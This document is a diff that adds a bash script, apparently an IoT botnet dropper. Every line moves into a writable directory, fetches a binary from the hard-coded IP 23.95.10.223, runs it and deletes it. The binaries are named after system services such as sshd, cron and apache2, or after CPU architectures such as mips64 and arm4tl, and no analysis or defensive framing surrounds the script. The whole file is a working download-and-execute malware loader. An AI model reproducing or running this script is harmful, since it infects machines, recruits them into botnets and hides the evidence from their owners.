@@ -1,0 +1,20 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/sshd; chmod +x sshd; ./sshd; rm -rf sshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/openssh; chmod +x openssh; ./openssh; rm -rf openssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/bash; chmod +x bash; ./bash; rm -rf bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/tftp; chmod +x tftp; ./tftp; rm -rf tftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/wget; chmod +x wget; ./wget; rm -rf wget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/cron; chmod +x cron; ./cron; rm -rf cron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/ftp; chmod +x ftp; ./ftp; rm -rf ftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/pftp; chmod +x pftp; ./pftp; rm -rf pftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/sh; chmod +x sh; ./sh; rm -rf sh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/[cpu]; chmod +x [cpu]; ./[cpu]; rm -rf [cpu]
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/sh2eb; chmod +x sh2eb; ./sh2eb; rm -rf sh2eb
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/sh2elf; chmod +x sh2elf; ./sh2elf; rm -rf sh2elf
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/powerpc; chmod +x powerpc; ./powerpc; rm -rf powerpc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/mips64; chmod +x mips64; ./mips64; rm -rf mips64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/i486; chmod +x i486; ./i486; rm -rf i486
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.95.10.223/arm4tl; chmod +x arm4tl; ./arm4tl; rm -rf arm4tl
